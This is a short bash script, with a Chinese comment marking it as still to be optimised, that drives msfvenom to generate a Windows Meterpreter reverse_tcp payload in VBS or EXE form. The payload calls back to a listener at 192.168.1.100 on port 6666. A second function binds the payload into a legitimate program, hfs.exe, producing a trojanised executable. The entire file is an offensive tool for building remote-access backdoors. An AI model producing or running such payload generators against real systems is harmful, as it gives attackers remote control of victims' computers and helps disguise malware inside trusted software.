#!/bin/bash

ip=192.168.1.100
port=6666
arch=x86
platform=windows
format=vbs # exe
payload=windows/meterpreter/reverse_tcp
bounds=./hfs.exe

# use exploit/multi/handler
function meter_re_tcp(){
    out_file=./meter_re_tcp_${arch}.${format}
    msfvenom -p ${payload} LHOST=${ip} LPORT=${port} -f ${format} -a ${arch} --platform=${platform} -o ${out_file}
}

# bounds
function meter_re_tcp_x(){
    out_file=./meter_re_tcp_${arch}.${format}
    msfvenom -p ${payload} LHOST=${ip} LPORT=${port} -f ${format} -x ${bounds} -a ${arch} --platform=${platform} -o ${out_file}
}

meter_re_tcp
#meter_re_tcp_x
# 待优化